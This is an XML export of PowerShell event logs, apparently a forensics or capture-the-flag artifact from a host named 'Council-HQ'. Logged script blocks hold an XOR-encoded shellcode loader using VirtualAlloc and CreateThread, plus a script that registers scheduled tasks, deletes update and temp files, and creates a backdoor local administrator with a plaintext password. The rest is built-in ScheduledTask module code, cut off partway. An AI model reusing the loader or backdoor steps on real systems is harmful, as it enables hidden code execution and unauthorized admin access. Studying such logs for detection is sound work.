<?xml version="1.1" encoding="utf-8" standalone="yes" ?>

<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">40961</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>4</Task>
<Opcode>1</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:34:55.968788"></TimeCreated>
<EventRecordID>1</EventRecordID>
<Correlation ActivityID="{2f2cff59-615d-0000-13ae-2e2f5d61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="1612" ThreadID="7884"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1001"></Security>
</System>
<EventData></EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">53504</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>111</Task>
<Opcode>10</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:34:56.487679"></TimeCreated>
<EventRecordID>2</EventRecordID>
<Correlation ActivityID="{2f2cff59-615d-0000-13ae-2e2f5d61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="1612" ThreadID="1768"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1001"></Security>
</System>
<EventData><Data Name="param1">1612</Data>
<Data Name="param2">DefaultAppDomain</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">40962</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>4</Task>
<Opcode>2</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:34:58.127523"></TimeCreated>
<EventRecordID>3</EventRecordID>
<Correlation ActivityID="{2f2cff59-615d-0000-13ae-2e2f5d61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="1612" ThreadID="7884"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1001"></Security>
</System>
<EventData></EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">40961</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>4</Task>
<Opcode>1</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:38:17.733253"></TimeCreated>
<EventRecordID>4</EventRecordID>
<Correlation ActivityID="{0e625a87-615f-0003-a4ca-620e5f61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="1352" ThreadID="1296"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1001"></Security>
</System>
<EventData></EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">53504</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>111</Task>
<Opcode>10</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:38:18.030928"></TimeCreated>
<EventRecordID>5</EventRecordID>
<Correlation ActivityID="{0e625a87-615f-0003-a4ca-620e5f61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="1352" ThreadID="6348"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1001"></Security>
</System>
<EventData><Data Name="param1">1352</Data>
<Data Name="param2">DefaultAppDomain</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">40962</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>4</Task>
<Opcode>2</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:38:18.926090"></TimeCreated>
<EventRecordID>6</EventRecordID>
<Correlation ActivityID="{0e625a87-615f-0003-a4ca-620e5f61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="1352" ThreadID="1296"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1001"></Security>
</System>
<EventData></EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4104</EventID>
<Version>1</Version>
<Level>3</Level>
<Task>2</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:40:31.473396"></TimeCreated>
<EventRecordID>7</EventRecordID>
<Correlation ActivityID="{0e625a87-615f-0003-92d0-620e5f61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="1352" ThreadID="5472"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1001"></Security>
</System>
<EventData><Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$OleSPrlmhB = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

[byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;
[byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;

$tNZvQCljVk = Add-Type -memberDefinition $OleSPrlmhB -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]] $HVOASfFuNSxRXR = 0x2d,0x99,0x52,0x35,0x21,0x39,0x1d,0xd1,0xd1,0xd1,0x90,0x80,0x90,0x81,0x83,0x99,0xe0,0x03,0xb4,0x99,0x5a,0x83,0xb1,0x99,0x5a,0x83,0xc9,0x80,0x87,0x99,0x5a,0x83,0xf1,0x99,0xde,0x66,0x9b,0x9b,0x9c,0xe0,0x18,0x99,0x5a,0xa3,0x81,0x99,0xe0,0x11,0x7d,0xed,0xb0,0xad,0xd3,0xfd,0xf1,0x90,0x10,0x18,0xdc,0x90,0xd0,0x10,0x33,0x3c,0x83,0x99,0x5a,0x83,0xf1,0x90,0x80,0x5a,0x93,0xed,0x99,0xd0,0x01,0xb7,0x50,0xa9,0xc9,0xda,0xd3,0xde,0x54,0xa3,0xd1,0xd1,0xd1,0x5a,0x51,0x59,0xd1,0xd1,0xd1,0x99,0x54,0x11,0xa5,0xb6,0x99,0xd0,0x01,0x5a,0x99,0xc9,0x81,0x95,0x5a,0x91,0xf1,0x98,0xd0,0x01,0x32,0x87,0x99,0x2e,0x18,0x9c,0xe0,0x18,0x90,0x5a,0xe5,0x59,0x99,0xd0,0x07,0x99,0xe0,0x11,0x90,0x10,0x18,0xdc,0x7d,0x90,0xd0,0x10,0xe9,0x31,0xa4,0x20,0x9d,0xd2,0x9d,0xf5,0xd9,0x94,0xe8,0x00,0xa4,0x09,0x89,0x95,0x5a,0x91,0xf5,0x98,0xd0,0x01,0xb7,0x90,0x5a,0xdd,0x99,0x95,0x5a,0x91,0xcd,0x98,0xd0,0x01,0x90,0x5a,0xd5,0x59,0x90,0x89,0x90,0x89,0x8f,0x88,0x99,0xd0,0x01,0x8b,0x90,0x89,0x90,0x88,0x90,0x8b,0x99,0x52,0x3d,0xf1,0x90,0x83,0x2e,0x31,0x89,0x90,0x88,0x8b,0x99,0x5a,0xc3,0x38,0x9a,0x2e,0x2e,0x2e,0x8c,0x98,0x6f,0xa6,0xa2,0xe3,0x8e,0xe2,0xe3,0xd1,0xd1,0x90,0x87,0x98,0x58,0x37,0x99,0x50,0x3d,0x71,0xd0,0xd1,0xd1,0x98,0x58,0x34,0x98,0x6d,0xd3,0xd1,0xd4,0xe8,0x11,0x79,0xd1,0xc3,0x90,0x85,0x98,0x58,0x35,0x9d,0x58,0x20,0x90,0x6b,0x9d,0xa6,0xf7,0xd6,0x2e,0x04,0x9d,0x58,0x3b,0xb9,0xd0,0xd0,0xd1,0xd1,0x88,0x90,0x6b,0xf8,0x51,0xba,0xd1,0x2e,0x04,0xbb,0xdb,0x90,0x8f,0x81,0x81,0x9c,0xe0,0x18,0x9c,0xe0,0x11,0x99,0x2e,0x11,0x99,0x58,0x13,0x99,0x2e,0x11,0x99,0x58,0x10,0x90,0x6b,0x3b,0xde,0x0e,0x31,0x2e,0x04,0x99,0x58,0x16,0xbb,0xc1,0x90,0x89,0x9d,0x58,0x33,0x99,0x58,0x28,0x90,0x6b,0x48,0x74,0xa5,0xb0,0x2e,0x04,0x54,0x11,0xa5,0xdb,0x98,0x2e,0x1f,0xa4,0x34,0x39,0x42,0xd1,0xd1,0xd1,0x99,0x52,0x3d,0xc1,0x99,0x58,0x33,0x9c,0xe0,0x18,0xbb,0xd5,0x90,0x89,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xaf,0x84,0x99,0x52,0x15,0xf1,0x8f,0x58,0x27,0xbb,0x91,0x90,0x88,0xb9,0xd1,0xc1,0xd1,0xd1,0x90,0x89,0x99,0x58,0x23,0x99,0xe0,0x18,0x90,0x6b,0x89,0x75,0x82,0x34,0x2e,0x04,0x99,0x58,0x12,0x98,0x58,0x16,0x9c,0xe0,0x18,0x98,0x58,0x21,0x99,0x58,0x0b,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xac,0xf9,0x89,0x90,0x86,0x88,0xb9,0xd1,0x91,0xd1,0xd1,0x90,0x89,0xbb,0xd1,0x8b,0x90,0x6b,0xda,0xfe,0xde,0xe1,0x2e,0x04,0x86,0x88,0x90,0x6b,0xa4,0xbf,0x9c,0xb0,0x2e,0x04,0x98,0x2e,0x1f,0x38,0xed,0x2e,0x2e,0x2e,0x99,0xd0,0x12,0x99,0xf8,0x17,0x99,0x54,0x27,0xa4,0x65,0x90,0x2e,0x36,0x89,0xbb,0xd1,0x88,0x98,0x16,0x13,0x21,0x64,0x73,0x87,0x2e,0x04;

[array]::Reverse($stage2);

$hRffYLENA = $tNZvQCljVk::VirtualAlloc(0,[Math]::Max($HVOASfFuNSxRXR.Length,0x1000),0x3000,0x40);

$stage3 = $stage1 + $stage2;

[System.Runtime.InteropServices.Marshal]::Copy($HVOASfFuNSxRXR,0,$hRffYLENA,$HVOASfFuNSxRXR.Length);


# Unpack Shellcode;

for($i=0; $i -lt $HVOASfFuNSxRXR.count ; $i++)
{
    $HVOASfFuNSxRXR[$i] = $HVOASfFuNSxRXR[$i] -bxor 0xd1;
}

#Unpack Special Orders!

for($i=0;$i -lt $stage3.count;$i++){
    $stage3[$i] = $stage3[$i] -bxor 0xd1;
}

$tNZvQCljVk::CreateThread(0,0,$hRffYLENA,0,0,0);
</Data>
<Data Name="ScriptBlockId">3f384b05-3a00-4a65-bbf7-e31b331ac923</Data>
<Data Name="Path">C:\sysmgr\special_orders.ps1</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4103</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>106</Task>
<Opcode>20</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:40:31.675446"></TimeCreated>
<EventRecordID>8</EventRecordID>
<Correlation ActivityID="{0e625a87-615f-0003-93d0-620e5f61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="1352" ThreadID="5472"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1001"></Security>
</System>
<EventData><Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.22000.652
        Host ID = 046315d8-81c0-4cbb-bc67-8ce42c688050
        Host Application = C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.22000.652
        Runspace ID = 769bdae8-34c8-4850-b408-3eca4f0beb3d
        Pipeline ID = 55
        Command Name = Add-Type
        Command Type = Cmdlet
        Script Name = C:\sysmgr\special_orders.ps1
        Command Path = 
        Sequence Number = 19
        User = Council-HQ\Council Leader
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
<Data Name="UserData"></Data>
<Data Name="Payload">CommandInvocation(Add-Type): "Add-Type"
ParameterBinding(Add-Type): name="MemberDefinition"; value="[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);, ..."
ParameterBinding(Add-Type): name="Name"; value="Win32"
ParameterBinding(Add-Type): name="Namespace"; value="Win32Functions"
ParameterBinding(Add-Type): name="PassThru"; value="True"
</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">40961</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>4</Task>
<Opcode>1</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:42:10.300592"></TimeCreated>
<EventRecordID>9</EventRecordID>
<Correlation ActivityID="{0e625a87-615f-0000-5df9-620e5f61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="10084" ThreadID="9060"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1002"></Security>
</System>
<EventData></EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">53504</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>111</Task>
<Opcode>10</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:42:10.702509"></TimeCreated>
<EventRecordID>10</EventRecordID>
<Correlation ActivityID="{0e625a87-615f-0000-5df9-620e5f61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="10084" ThreadID="1256"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1002"></Security>
</System>
<EventData><Data Name="param1">10084</Data>
<Data Name="param2">DefaultAppDomain</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">40962</EventID>
<Version>1</Version>
<Level>4</Level>
<Task>4</Task>
<Opcode>2</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:42:12.167070"></TimeCreated>
<EventRecordID>11</EventRecordID>
<Correlation ActivityID="{0e625a87-615f-0000-5df9-620e5f61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="10084" ThreadID="9060"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1002"></Security>
</System>
<EventData></EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4104</EventID>
<Version>1</Version>
<Level>3</Level>
<Task>2</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:43:51.430065"></TimeCreated>
<EventRecordID>12</EventRecordID>
<Correlation ActivityID="{0e625a87-615f-0001-4313-630e5f61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="10084" ThreadID="8628"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1002"></Security>
</System>
<EventData><Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText"># Create a new task action
$taskAction = New-ScheduledTaskAction -Execute 'powershell.exe';
$taskTrigger = New-ScheduledTaskTrigger -Daily -At 3PM;

# The name of your scheduled task.
$taskName = "Elevate Powers"

# Describe the scheduled task.
$description = "Steal weapons"

# Register the scheduled task
Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Description $description

# Create a new task action
$taskAction = New-ScheduledTaskAction -Execute 'powershell.exe';
$taskTrigger = New-ScheduledTaskTrigger -Daily -At 3PM;

# The name of your scheduled task.
$taskName = "Sabotage Miyuki"

# Describe the scheduled task.
$description = "Bypass Arms Embargo"

# Register the scheduled task
Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Description $description

#start windows update service
Get-Service -Name wuauserv | Start-Service -Verbose

#delete childs
Get-ChildItem "C:\Windows\SoftwareDistribution\*" -Recurse -Force -Verbose -ErrorAction SilentlyContinue | remove-item -force -Verbose -recurse -ErrorAction SilentlyContinue

#clear temp folder
Get-ChildItem "C:\users\*\AppData\Local\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue |

Where-Object { ($_.CreationTime -lt $(Get-Date).AddDays(-$DaysToDelete))} |

remove-item -force -Verbose -recurse -ErrorAction SilentlyContinue


cleanmgr /sagerun:12

do {

"waiting for cleanmgr to complete. . ."

start-sleep 5

} while ((get-wmiobject win32_process | where-object {$_.processname -eq &#8216;cleanmgr.exe&#8217;} | measure).count)


# Create Admin Account
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )    
    begin {
    }    
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"
    }    
    end {
    }
}
$NewLocalAdmin = "backup_op";
$Password = ConvertTo-SecureString "sup3rk3y" -AsPlainText -Force;

Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password</Data>
<Data Name="ScriptBlockId">e5b96706-b1e3-4303-b3ba-27f47f964444</Data>
<Data Name="Path">C:\sysmgr\sys_mgr.ps1</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
<EventID Qualifiers="">4104</EventID>
<Version>1</Version>
<Level>3</Level>
<Task>2</Task>
<Opcode>15</Opcode>
<Keywords>0x0000000000000000</Keywords>
<TimeCreated SystemTime="2022-05-06 15:43:52.376516"></TimeCreated>
<EventRecordID>13</EventRecordID>
<Correlation ActivityID="{0e625a87-615f-0003-301b-630e5f61d801}" RelatedActivityID=""></Correlation>
<Execution ProcessID="10084" ThreadID="8628"></Execution>
<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
<Computer>Council-HQ</Computer>
<Security UserID="S-1-5-21-2389065719-3342106636-307857974-1002"></Security>
</System>
<EventData><Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'Root/Microsoft/Windows/TaskScheduler/MSFT_ScheduledTask'
$script:ClassVersion = ''
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-ScheduledTask
{
    [CmdletBinding(DefaultParameterSetName='ByPath', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#Root/Microsoft/Windows/TaskScheduler/MSFT_ScheduledTask')]

    param(
    
    [Parameter(ParameterSetName='ByPath', Position=0, ValueFromPipelineByPropertyName=$true)]
    [ValidateNotNull()]
    [string[]]
    ${TaskName},

    [Parameter(ParameterSetName='ByPath', Position=1, ValueFromPipelineByPropertyName=$true)]
    [ValidateNotNull()]
    [string[]]
    ${TaskPath},

    [Parameter(ParameterSetName='ByPath')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByPath')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByPath')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('TaskName') -and (@('ByPath') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${TaskName})
        $__cmdletization_queryBuilder.FilterByProperty('TaskName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('TaskPath') -and (@('ByPath') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${TaskPath})
        $__cmdletization_queryBuilder.FilterByProperty('TaskPath', $__cmdletization_values, $true, 'Default')
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_ScheduledTask_v1.0.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-ScheduledTask' -Alias '*'
        

function Unregister-ScheduledTask
{
    [CmdletBinding(DefaultParameterSetName='ByPath', SupportsShouldProcess=$true, ConfirmImpact='High', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#Root/Microsoft/Windows/TaskScheduler/MSFT_ScheduledTask')]

    param(
    
    [Parameter(ParameterSetName='ByPath', Position=0, ValueFromPipelineByPropertyName=$true)]
    [ValidateNotNull()]
    [string[]]
    ${TaskName},

    [Parameter(ParameterSetName='ByPath', Position=1, ValueFromPipelineByPropertyName=$true)]
    [ValidateNotNull()]
    [string[]]
    ${TaskPath},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByPath')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByPath')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByPath')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByPath')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('TaskName') -and (@('ByPath') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${TaskName})
        $__cmdletization_queryBuilder.FilterByProperty('TaskName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('TaskPath') -and (@('ByPath') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${TaskPath})
        $__cmdletization_queryBuilder.FilterByProperty('TaskPath', $__cmdletization_values, $true, 'Default')
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByPath', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
